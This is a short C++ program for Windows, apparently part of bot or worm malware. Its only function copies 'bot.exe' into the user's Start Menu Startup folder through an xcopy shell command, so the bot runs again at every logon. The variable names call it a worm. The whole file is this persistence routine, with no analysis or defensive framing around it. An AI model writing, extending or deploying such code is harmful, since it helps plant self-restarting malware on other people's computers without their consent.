#include <iostream>
#include <Windows.h>

inline void saveStartup()
{
    std::string startup_directory       =  "\"%HOMEDRIVE%%HOMEPATH%\\Start Menu\\Programs\\Startup";
    std::string dir_place_worm          =  startup_directory + "\\bot.exe";
    std::string cmd_copy_worm_startup   =  "xcopy \".\\bot.exe\" " + dir_place_worm + "*\" /Y";
    const char *cmd_copy_worm_startup_p =  cmd_copy_worm_startup.c_str();
    
    system(cmd_copy_worm_startup_p);
}

int main() {
    saveStartup();
    return 0;
}
